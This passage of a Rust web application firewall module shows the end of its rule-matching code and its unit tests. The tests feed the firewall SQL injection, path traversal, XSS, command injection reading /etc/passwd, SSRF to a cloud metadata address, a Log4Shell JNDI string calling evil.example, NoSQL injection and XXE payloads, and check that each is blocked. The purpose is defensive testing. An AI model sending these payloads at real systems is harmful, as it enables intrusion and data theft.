                _ => return WafVerdict::Allow,
            },
        };
        let decoded_text = percent_decode_lossy(text);
        let max_pl = cfg.crs_paranoia_level.clamp(1, 4);
        for rule in &self.rules {
            if rule.paranoia_level > max_pl || cfg.disabled_rule_ids.contains(&rule.id) {
                continue;
            }
            if (rule.targets.body || rule.targets.args)
                && (rule.matcher.is_match(text) || rule.matcher.is_match(decoded_text.as_ref()))
            {
                return Self::make_verdict(cfg.mode, rule, "body", decoded_text.as_ref());
            }
        }
        WafVerdict::Allow
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use http::HeaderValue;

    fn block_cfg() -> WafConfig {
        WafConfig {
            mode: WafMode::Block,
            ..Default::default()
        }
    }

    #[test]
    fn benign_browser_and_api_requests_pass_without_false_positives() {
        let cfg = block_cfg();
        let mut headers = HeaderMap::new();
        headers.insert(
            header::USER_AGENT,
            HeaderValue::from_static(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            ),
        );
        headers.insert(
            header::REFERER,
            HeaderValue::from_static("http://127.0.0.1:8080/dashboard?tab=services"),
        );
        headers.insert(
            header::COOKIE,
            HeaderValue::from_static(
                "exposure_clearance=eyJhbGciOiJIUzI1NiJ9.payload.sig; id=42; theme=dark",
            ),
        );

        let v = inspect_request_head(
            &cfg,
            "/api/v1/services/web-main",
            Some("page=2&limit=50&sort=updated_at&q=hello+world"),
            &headers,
        );
        assert!(matches!(v, WafVerdict::Allow), "unexpected verdict: {v:?}");

        let large_json = format!(
            r#"{{"items":[{}],"note":"Please select your preferred package (20% off today)"}}"#,
            (0..80)
                .map(|i| format!(r#"{{"id":{i},"name":"item_{i}","active":true}}"#))
                .collect::<Vec<_>>()
                .join(",")
        );
        assert!(large_json.len() > 2500);
        let bv = inspect_request_body(&cfg, Some("application/json"), large_json.as_bytes());
        assert!(matches!(bv, WafVerdict::Allow), "unexpected body verdict: {bv:?}");
    }

    #[test]
    fn blocks_common_web_attacks_across_path_query_headers_and_body() {
        let cfg = block_cfg();
        let empty = HeaderMap::new();

        // SQLi in query (both %20 and + space encoding)
        assert!(inspect_request_head(&cfg, "/search", Some("q=admin'+OR+'1'='1'+--"), &empty).is_block());
        assert!(inspect_request_head(
            &cfg,
            "/items",
            Some("id=1%20UNION%20SELECT%20username,password%20FROM%20users"),
            &empty
        )
        .is_block());

        // Path Traversal in path
        assert!(inspect_request_head(&cfg, "/files/../../../../etc/passwd", None, &empty).is_block());

        // XSS in query
        assert!(inspect_request_head(
            &cfg,
            "/profile",
            Some("bio=%3Csvg%20onload%3Dalert(1)%3E"),
            &empty
        )
        .is_block());

        // Command Injection in query
        assert!(inspect_request_head(&cfg, "/ping", Some("host=1.1.1.1;cat${IFS}/etc/passwd"), &empty).is_block());

        // SSRF in query
        assert!(inspect_request_head(
            &cfg,
            "/fetch",
            Some("url=http://169.254.169.254/latest/meta-data/"),
            &empty
        )
        .is_block());

        // Log4Shell / JNDI in User-Agent
        let mut log4j_hdrs = HeaderMap::new();
        log4j_hdrs.insert(
            header::USER_AGENT,
            HeaderValue::from_static("${jndi:ldap://evil.example/Exploit}"),
        );
        match inspect_request_head(&cfg, "/", None, &log4j_hdrs) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "deserialization");
                assert_eq!(f.location, "header:user-agent");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // NoSQL injection in JSON body
        let nosql = br#"{"username":{"$ne":null},"password":{"$gt":""}}"#;
        match inspect_request_body(&cfg, Some("application/json"), nosql) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "nosql-injection");
                assert_eq!(f.location, "body");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // SQLi in form-urlencoded body with `+` spaces
        let form = b"user=admin'+OR+'1'='1'+--&pass=123";
        assert!(inspect_request_body(&cfg, Some("application/x-www-form-urlencoded"), form).is_block());

        // XXE in XML body
        let xxe = br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>"#;
        assert!(inspect_request_body(&cfg, Some("application/xml"), xxe).is_block());
    }

    #[test]
    fn respects_modes_categories_and_exempt_paths() {
        let empty = HeaderMap::new();

        // Off mode allows everything
        let off = WafConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&off, "/../../etc/passwd", None, &empty),
            WafVerdict::Allow
        ));

        // Monitor mode reports finding without blocking
        let mon = WafConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&mon, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Monitor(f) if f.category == "xss"
        ));

        // Category filter: SQLi-only ignores XSS but blocks SQLi
        let sqli_only = WafConfig {
            mode: WafMode::Block,
            categories: vec![WafCategory::SqlInjection],
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&sqli_only, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Allow
        ));
        assert!(inspect_request_head(&sqli_only, "/search", Some("q=' OR '1'='1"), &empty).is_block());

        // Exempt path respects segment boundary
        let exempt = WafConfig {
            mode: WafMode::Block,
            exempt_paths: vec!["/api/webhooks".into()],
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&exempt, "/api/webhooks/stripe", Some("q=' OR '1'='1"), &empty),
            WafVerdict::Allow
        ));
        assert!(
            inspect_request_head(&exempt, "/api/webhooks-other", Some("q=' OR '1'='1"), &empty)
                .is_block()
        );
    }

    #[test]
    fn skips_binary_and_multipart_body_inspection() {
        let cfg = block_cfg();
        let mut h_multi = HeaderMap::new();
        h_multi.insert(
            header::CONTENT_TYPE,
            HeaderValue::from_static("multipart/form-data; boundary=----abc"),
        );
        assert!(should_inspect_body(&cfg, &Method::POST, &h_multi, false).is_none());

        let mut h_json = HeaderMap::new();
        h_json.insert(header::CONTENT_TYPE, HeaderValue::from_static("application/json; charset=utf-8"));
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_json, false),
            Some(32 * 1024)
        );
        assert!(should_inspect_body(&cfg, &Method::GET, &h_json, false).is_none());
        assert!(should_inspect_body(&cfg, &Method::POST, &h_json, true).is_none());
    }

    #[test]
    fn compiled_crs_engine_matches_and_respects_disabled_ids() {
        let engine = CompiledCrsEngine::compile(&[], &[]);
        assert!(engine.rule_count() >= 8);

        let cfg = block_cfg();
        let mut h_scan = HeaderMap::new();
        h_scan.insert(header::USER_AGENT, HeaderValue::from_static("sqlmap/1.8.2#stable"));
        match engine.inspect_head(&cfg, "/", None, &h_scan) {
            WafVerdict::Block(f) => {
                assert_eq!(f.rule_id, Some(913100));
                assert_eq!(f.category, "scanner");
            }
            other => panic!("expected CRS 913100 block, got {other:?}"),
        }

        // Disabling rule 913100 allows that User-Agent through
        let mut cfg_dis = block_cfg();
        cfg_dis.disabled_rule_ids = vec![913100];
        assert!(matches!(
            engine.inspect_head(&cfg_dis, "/", None, &h_scan),
            WafVerdict::Allow
        ));
    }

    #[test]
    fn closes_sqli_tautology_cmdi_and_encoded_crs_gaps_without_false_positives() {
        let cfg = block_cfg();
        let crs = CompiledCrsEngine::compile(&[], &[]);
        let empty = HeaderMap::new();

        for (path, q) in [
            ("/oauth/authorize", "client_id=1%20OR%201%3D1"),
            ("/oauth/authorize", "client_id=1 OR 1=1"),
            ("/oauth/authorize", "client_id=1 AND 1=2"),
            ("/oauth/authorize", "client_id=;id"),
            ("/oauth/authorize", "client_id=;id;#"),
            ("/oauth/authorize", "client_id=%3Bid%3B%23"),
            ("/oauth/authorize", "client_id=;ls"),
            ("/oauth/authorize", "client_id=%3Bls%20-la"),
            ("/oauth/authorize", "client_id=;echo%20hi"),
        ] {
            let v_head = inspect_request_head(&cfg, path, Some(q), &empty);
            let v_crs = crs.inspect_head(&cfg, path, Some(q), &empty);
            assert!(
                v_head.is_block() || v_crs.is_block(),
                "expected block on `{path}?{q}`, head={v_head:?}, crs={v_crs:?}"
            );
        }

        // Benign inputs including JSON `#` and `--` strings and normal cookies must NOT trigger
        let mut h_benign = HeaderMap::new();
        h_benign.insert(
            header::USER_AGENT,
            HeaderValue::from_static("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36"),
        );
        h_benign.insert(header::COOKIE, HeaderValue::from_static("a=1; id=2; session=ok"));
        assert!(matches!(
            inspect_request_head(&cfg, "/oauth/authorize", Some("client_id=web-portal&state=xyz"), &h_benign),
            WafVerdict::Allow
        ));
        assert!(matches!(
            crs.inspect_head(&cfg, "/oauth/authorize", Some("client_id=web-portal&state=xyz"), &h_benign),
            WafVerdict::Allow
        ));
        let benign_json = br##"{"bio":"#rust","note":"please select or check","items":[{"id":1,"name":"a"}]}"##;
        assert!(matches!(
            inspect_request_body(&cfg, Some("application/json"), benign_json),
            WafVerdict::Allow
        ));
        let benign_json_dash = br##"{"bio":"#rust","flag":"--help","note":"please select or check"}"##;
        assert!(matches!(
            crs.inspect_body(&cfg, benign_json_dash),
            WafVerdict::Allow
        ));
    }
}
